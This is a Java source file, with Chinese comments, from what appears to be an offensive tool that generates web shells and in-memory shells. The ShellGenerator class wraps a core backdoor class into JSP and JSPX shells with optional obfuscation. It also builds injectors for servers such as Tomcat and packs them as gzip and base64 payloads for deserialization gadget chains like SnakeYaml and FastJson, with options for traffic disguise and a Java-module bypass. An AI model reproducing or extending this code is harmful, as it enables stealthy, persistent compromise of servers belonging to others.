package org.leo.jmg;

import org.leo.core.entity.Disguise;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.jmg.core.LeoCore;
import org.leo.jmg.jsp.http.JspServer;
import org.leo.jmg.jsp.http.JspxServer;
import org.leo.jmg.mem.injectortpl.InjectorGenerator;
import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;

import java.util.Base64;
import java.util.List;

/**
 * Shell生成器
 * 将org.leo.shell下的类串联起来生成真正可执行的代码
 */
public class ShellGenerator {

    private final ShellGeneratorConfig config;
    private final Disguise reqDisguise;
    private final Disguise respDisguise;
    private final String coreClassName;
    private final int respCode;

    /**
     * 构造函数（使用配置类）
     *
     * @param config Shell生成器配置
     */
    public ShellGenerator(ShellGeneratorConfig config) {
        config.validate();
        this.config = config;
        this.reqDisguise = config.getReqDisguise();
        this.respDisguise = config.getRespDisguise();
        this.coreClassName = config.getCoreClassName();
        this.respCode = config.getRespCode();
    }

    /**
     * 生成核心类字节码
     *
     * @return 核心类字节码（已缩小体积）
     * @throws Exception 生成异常
     */
    private byte[] generateCoreClass() throws Exception {
        LeoCore leoCore = new LeoCore(reqDisguise, respDisguise);
        byte[] bytecode = leoCore.genLeoCoreByClassName(coreClassName, config);
        return ClassFileMinimizer.transform(bytecode);
    }

    /**
     * 生成JSP格式的shell
     *
     * @return JSP代码字符串
     * @throws Exception 生成异常
     */
    public String generateJspShell() throws Exception {
        byte[] coreClass = generateCoreClass();
        String protocol = config.getProtocol();
        String raw;
        if ("httpchunk".equals(protocol)) {
            org.leo.jmg.jsp.httpchunk.JspServer jspServer = new org.leo.jmg.jsp.httpchunk.JspServer();
            raw = jspServer.wrap(coreClassName, coreClass, respCode);
        } else {
            JspServer jspServer = new JspServer();
            raw = jspServer.wrap(coreClassName, coreClass, respCode);
        }
        return buildWebShellPipeline(raw, true).apply(raw);
    }

    /**
     * 生成JSPX格式的shell
     *
     * @return JSPX代码字符串
     * @throws Exception 生成异常
     */
    public String generateJspxShell() throws Exception {
        byte[] coreClass = generateCoreClass();
        String protocol = config.getProtocol();
        String raw;
        if ("httpchunk".equals(protocol)) {
            org.leo.jmg.jsp.httpchunk.JspxServer jspxServer = new org.leo.jmg.jsp.httpchunk.JspxServer();
            raw = jspxServer.wrap(coreClassName, coreClass, respCode);
        } else {
            JspxServer jspxServer = new JspxServer();
            raw = jspxServer.wrap(coreClassName, coreClass, respCode);
        }
        return buildWebShellPipeline(raw, false).apply(raw);
    }

    /**
     * 根据 config.jspObfuscationSteps 构建 WebShell 混淆 pipeline。
     * <p>
     * WebShell 混淆是完全 opt-in 的：
     * <ul>
     *   <li>null = 未配置，直接返回原始代码（不做任何混淆）</li>
     *   <li>非 null 列表（含空列表）= 用户已配置，按列表执行；空列表即主动禁用全部</li>
     * </ul>
     * 与内存马不同，WebShell 不设置默认预设，以保证基础可用性。
     * <p>
     * 当 {@code isJsp=false}（生成 JSPX）时，自动过滤掉不兼容 JSPX 的步骤
     * （如 INSERT_SCRIPT_NOISE、WRAP_HTML_JS），避免破坏 XML 结构。
     */
    private JspObfuscationPipeline buildWebShellPipeline(String ignored, boolean isJsp) {
        List<String> steps = config.getJspObfuscationSteps();
        List<String> effectiveSteps = steps != null ? steps : java.util.Collections.<String>emptyList();

        if (!isJsp && !effectiveSteps.isEmpty()) {
            // 构建 stepId -> StepDescriptor 查找表
            java.util.Map<String, JspObfuscationPipeline.StepDescriptor> descMap =
                    new java.util.HashMap<String, JspObfuscationPipeline.StepDescriptor>();
            for (JspObfuscationPipeline.StepDescriptor d : JspObfuscationPipeline.getStepDescriptors()) {
                descMap.put(d.getId(), d);
            }
            // 过滤掉 JSPX 不支持的步骤
            java.util.List<String> filtered = new java.util.ArrayList<String>();
            for (String stepId : effectiveSteps) {
                JspObfuscationPipeline.StepDescriptor desc = descMap.get(stepId);
                if (desc == null || desc.isJspxCompatible()) {
                    filtered.add(stepId);
                }
            }
            effectiveSteps = filtered;
        }

        return JspObfuscationPipeline.fromStepIds(effectiveSteps);
    }

    /**
     * 验证Header配置
     *
     * @param headerName  Header名称
     * @param headerValue Header值
     * @throws IllegalArgumentException 如果配置无效
     */
    private void validateHeaderConfig(String headerName, String headerValue) {
        if (headerName == null || headerValue == null) {
            throw new IllegalArgumentException("配置类中headerName和headerValue不能为空");
        }
    }
    
    /**
     * 生成注入器类字节码（注入器形态取自 {@link ShellGeneratorConfig#getShellType()}）
     *
     * @return 注入器类字节码（已缩小体积）
     * @throws Exception 生成异常
     */
    private byte[] generateInjector() throws Exception {
        String shellType = config.getShellType();

        String injectorClassName = getOrGenerateClassName(config.getInjectorClassName());
        config.setInjectorClassName(injectorClassName);

        String shellClassName = getOrGenerateClassName(config.getShellClassName());
        config.setShellClassName(shellClassName);

        String headerName = config.getHeaderName();
        String headerValue = config.getHeaderValue();
        boolean isAbstractTranslet = config.isAbstractTranslet();
        // 对部分打包器（SnakeYaml 别名、AbstractTranslet 族、FastJson 链等）强制要求 AbstractTranslet
        if (requiresAbstractTranslet(config.getPackerType())) {
            isAbstractTranslet = true;
        }
        // 将最终值写回 config，供 InjectorGenerator.makeInjector() 读取
        config.setAbstractTranslet(isAbstractTranslet);
        String serverType = config.getServerType();

        validateHeaderConfig(headerName, headerValue);
        validateServerType(serverType);

        // 验证应用服务器类型是否支持该注入器形态
        if (!ServerInjectorMapper.isInjectorTypeSupported(serverType, shellType)) {
            throw new IllegalArgumentException("服务器类型 " + serverType + " 不支持 " + shellType + " 类型的注入器");
        }

        // 1) LeoCore 字节码
        config.setCoreClassBytes(generateCoreClass());

        // 2) 根据注册表获取模板（shellTplName / injectorTplName）
        ServerInjectorMapper.InjectorTemplatePair tpl = ServerInjectorMapper.getInjectorTemplate(serverType, shellType);

        String shellTplName = tpl.getShellTplName();
        String injectorTplName = tpl.getInjectorTplName();

        // 3) LeoCore → Shell（模板中使用 base64Decode + GZIPInputStream 还原，因此这里要 gzip + base64）
        org.leo.jmg.mem.shell.ShellGenerator memShellGenerator = new org.leo.jmg.mem.shell.ShellGenerator();
        byte[] shellClassBytes = memShellGenerator.makeShell(config, shellTplName);
        config.setShellClassBytes(shellClassBytes);

        // 4) Shell → Injector（注入器模板类中 decodeBase64 + gzipDecompress 还原，编码在 InjectorGenerator 内部完成）
        InjectorGenerator injectorGenerator = new InjectorGenerator();
        byte[] injectorClassBytes = injectorGenerator.makeInjector(config, injectorTplName);

        return ClassFileMinimizer.transform(injectorClassBytes);
    }



    /**
     * 判断某打包类型是否要求生成的注入器继承 AbstractTranslet
     */
    private boolean requiresAbstractTranslet(String packerType) {
        if (packerType == null) {
            return false;
        }
        return PackerRegistry.requiresAbstractTranslet(packerType);
    }
    
    /**
     * 获取或生成类名
     *
     * @param className 类名
     * @return 类名（如果为空则自动生成）
     */
    private String getOrGenerateClassName(String className) {
        if (className == null || className.trim().isEmpty()) {
            return ClassNameGenerator.generateServletStyleClassName();
        }
        return className;
    }
    
    /**
     * 验证应用服务器类型（与 Mapper 中 key 一致，如 Tomcat）
     */
    private void validateServerType(String serverType) {
        if (serverType == null || serverType.trim().isEmpty()) {
            throw new IllegalArgumentException(
                    "serverType 不能为空，请使用 serverType() 设置目标宿主机的服务器类型");
        }
    }


    /**
     * 使用 {@link Packer} 将注入器类打成字符串 payload
     */
    private String packPayload(String className, byte[] bytecode, Packer packer) throws Exception {
        ClassPackerConfig cfg = new ClassPackerConfig();
        cfg.setClassName(className);
        cfg.setClassBytes(bytecode);
        cfg.setClassBytesBase64Str(Base64.getEncoder().encodeToString(bytecode));
        cfg.setByPassJavaModule(config.isByPassJavaModule());
        cfg.setJspObfuscationSteps(config.getJspObfuscationSteps());
        cfg.setCustomTemplate(config.getCustomJspTemplate());
        return packer.pack(cfg);
    }

    /**
     * 生成完整注入器并经 Packer 打包为字符串（serverType / shellType / packerType 均来自 config）
     *
     * @return 打包后的 payload 字符串
     * @throws Exception 生成异常
     */
    public String generateFormattedInjector() throws Exception {
        config.validateForInjector();
        String packerType = config.getPackerType();

        Packer packer = ServerInjectorMapper.getPacker(packerType);
        if (packer == null) {
            throw new IllegalArgumentException("不支持的 packerType: " + packerType);
        }

        byte[] injectorClass = generateInjector();
        // generateInjector() 已将最终类名写回 config，直接读取，避免二次生成不同随机名
        String injectorClassName = config.getInjectorClassName();
        return packPayload(injectorClassName, injectorClass, packer);
    }

    // Getter方法

    public Disguise getReqDisguise() {
        return reqDisguise;
    }

    public Disguise getRespDisguise() {
        return respDisguise;
    }

    public String getCoreClassName() {
        return coreClassName;
    }

    public int getRespCode() {
        return respCode;
    }

    public ShellGeneratorConfig getConfig() {
        return config;
    }
}

